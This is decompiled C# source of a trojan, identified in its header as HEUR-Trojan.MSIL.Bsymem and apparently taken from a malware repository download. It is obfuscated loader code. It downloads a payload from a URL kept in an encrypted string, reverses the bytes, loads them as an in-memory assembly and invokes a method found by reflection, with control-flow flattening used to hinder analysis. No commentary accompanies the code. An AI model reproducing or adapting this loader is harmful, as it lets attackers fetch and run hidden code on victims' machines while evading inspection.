// Decompiled with JetBrains decompiler
// Type: Inutbu.Data
// Assembly: ENQ65774100030, Version=3.0.0.207, Culture=neutral, PublicKeyToken=null
// MVID: AAEAE42A-E43E-0EA5-7789-E86022A6FEE5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-20f2e7c67e7ef73a22db3d3c7b1cdb6a3dbef6130c8c0eb7fcbd9e298f7af4c8.exe

using Inutbu.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace Inutbu
{
  public static class Data
  {
    internal static Delegate \uE000;

    public static void Another()
    {
label_8:
      int num1 = \uE009.\uE004(39);
      int num2 = -61;
label_2:
      byte[] numArray;
      List<byte> byteList;
      int length;
      while (true)
      {
        num2 ^= 31;
label_4:
        int num3 = \uE009.\uE004(38);
        while (true)
        {
          switch (num3 ^ 34)
          {
            case 35:
              switch (num2 + 38)
              {
                case 0:
                  goto label_8;
                case 1:
                  switch (num1 + 28)
                  {
                    case 0:
                      numArray = Data.\uE002(\uE008.\uE000(37647));
                      num1 = \uE009.\uE004(34);
                      goto label_1;
                    case 1:
                      byteList = new List<byte>();
                      num1 = -50;
                      goto label_1;
                    case 2:
                      length = numArray.Length;
                      num1 = -49;
                      goto label_1;
                    case 3:
                      goto label_15;
                    default:
                      goto label_10;
                  }
                case 2:
label_1:
                  num1 ^= 40;
                  goto label_7;
                default:
                  num3 = 6;
                  continue;
              }
            case 36:
label_7:
              num2 = \uE009.\uE004(30);
              num3 = 7;
              continue;
            case 37:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_10:
        num2 = -59;
      }
label_15:
      while ((length-- <= 0 ? 0 : 1) != 0)
        byteList.Add(numArray[length]);
      AppDomain.CurrentDomain.Load(byteList.ToArray());
    }

    internal static void \uE000()
    {
label_2:
      int num1 = \uE009.\uE004(37);
      while (true)
      {
        int index1;
        Assembly[] assemblies;
        Assembly assembly;
        switch ((num1 ^ 31) + 29)
        {
          case 0:
            assemblies = AppDomain.CurrentDomain.GetAssemblies();
            num1 = -8;
            continue;
          case 1:
            if (index1 != 0)
            {
              num1 = -7;
              continue;
            }
            break;
          case 2:
            num1 = \uE009.\uE004(29);
            continue;
          case 3:
label_7:
            assembly = assemblies[index1];
            num1 = -9;
            continue;
          case 4:
            index1 = 0;
            num1 = -5;
            continue;
          case 5:
label_10:
            int num2 = \uE009.\uE004(33);
            while (true)
            {
              Type[] types;
              int index2;
              Type type;
              switch ((num2 ^ 30) + 39)
              {
                case 0:
                  types = assembly.GetTypes();
                  num2 = -64;
                  continue;
                case 1:
                  if (index2 != 0)
                  {
                    num2 = -59;
                    continue;
                  }
                  break;
                case 2:
label_14:
                  type = types[index2];
                  num2 = -63;
                  continue;
                case 3:
                  num2 = -61;
                  continue;
                case 4:
                  num2 = -57;
                  continue;
                case 5:
                  index2 = 0;
                  num2 = \uE009.\uE004(30);
                  continue;
                case 6:
                  try
                  {
                    MethodInfo method = type.GetMethod(\uE008.\uE000(37832));
label_20:
                    int num3 = \uE009.\uE004(28);
                    while (true)
                    {
                      switch ((num3 ^ 30) + 28)
                      {
                        case 0:
                          Data.\uE000.DynamicInvoke();
                          num3 = -8;
                          continue;
                        case 1:
                          Data.\uE000 = Delegate.CreateDelegate(typeof (Action), (object) null, method);
                          num3 = -6;
                          continue;
                        case 2:
                          num3 = -7;
                          continue;
                        case 3:
                          goto label_25;
                        default:
                          goto label_20;
                      }
                    }
                  }
                  catch
                  {
                  }
label_25:
                  ++index2;
                  break;
                default:
                  goto label_10;
              }
              if (index2 < types.Length)
                goto label_14;
              else
                break;
            }
            ++index1;
            break;
          default:
            goto label_2;
        }
        if (index1 < assemblies.Length)
          goto label_7;
        else
          break;
      }
    }

    internal static Assembly \uE001(byte[] _param0)
    {
label_8:
      int num1 = \uE009.\uE004(32);
      int num2 = -8;
label_2:
      Assembly assembly;
      while (true)
      {
        num2 ^= 39;
label_4:
        int num3 = \uE009.\uE004(36);
        while (true)
        {
          switch (num3 ^ 31)
          {
            case 37:
              switch (num2 + 35)
              {
                case 0:
                  goto label_8;
                case 1:
                  switch (num1 + 38)
                  {
                    case 0:
                      assembly = AppDomain.CurrentDomain.Load(_param0);
                      num1 = -7;
                      goto label_1;
                    case 1:
                    case 2:
                      goto label_12;
                    default:
                      goto label_10;
                  }
                case 2:
label_1:
                  num1 ^= 34;
                  goto label_7;
                default:
                  num3 = 57;
                  continue;
              }
            case 38:
label_7:
              num2 = \uE009.\uE004(40);
              num3 = 56;
              continue;
            case 39:
              goto label_2;
            default:
              goto label_4;
          }
        }
label_10:
        num2 = -6;
      }
label_12:
      return assembly;
    }

    internal static byte[] \uE002(string _param0)
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
label_7:
      // ISSUE: reference to a compiler-generated method
      int num1 = Resources.\uE000(44);
      int num2 = 26;
      while (true)
      {
        switch (num2 ^ 49)
        {
          case 41:
            goto label_7;
          case 42:
            switch (num1 + 42)
            {
              case 0:
                httpWebRequest.Method = \uE008.\uE000(37875);
                num1 = -4;
                goto label_4;
              case 1:
                num1 = -13;
                goto label_4;
              case 2:
                goto label_12;
              default:
                num2 = 24;
                continue;
            }
          case 43:
label_4:
            num1 ^= 43;
            break;
        }
        // ISSUE: reference to a compiler-generated method
        num2 = Resources.\uE000(49);
      }
label_12:
      MemoryStream memoryStream = new MemoryStream();
      try
      {
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        try
        {
          Stream responseStream = response.GetResponseStream();
          try
          {
            byte[] buffer = new byte[1024];
label_17:
            int num3;
            do
            {
              // ISSUE: reference to a compiler-generated method
              int num4 = Resources.\uE000(48);
              int count;
              bool flag;
              while (true)
              {
                switch (num4 ^ 37)
                {
                  case 31:
                    num4 = 1;
                    continue;
                  case 32:
                    memoryStream.Write(buffer, 0, count);
                    num4 = 58;
                    continue;
                  case 33:
                    count = responseStream.Read(buffer, 0, 1024);
                    // ISSUE: reference to a compiler-generated method
                    num4 = Resources.\uE000(43);
                    continue;
                  case 34:
                    if (flag)
                    {
                      num4 = 0;
                      continue;
                    }
                    goto label_26;
                  case 35:
                    flag = count > 0;
                    num4 = 7;
                    continue;
                  case 36:
                    num4 = 6;
                    continue;
                  case 37:
                    goto label_25;
                  default:
                    goto label_17;
                }
              }
label_25:
              num3 = 1;
              goto label_27;
label_26:
              num3 = 0;
label_27:;
            }
            while (num3 != 0);
            return memoryStream.ToArray();
          }
          finally
          {
            if ((responseStream == null ? 1 : 0) == 0)
              responseStream.Dispose();
          }
        }
        finally
        {
          if ((response == null ? 1 : 0) == 0)
            response.Dispose();
        }
      }
      finally
      {
        if ((memoryStream == null ? 1 : 0) == 0)
          memoryStream.Dispose();
      }
    }
  }
}
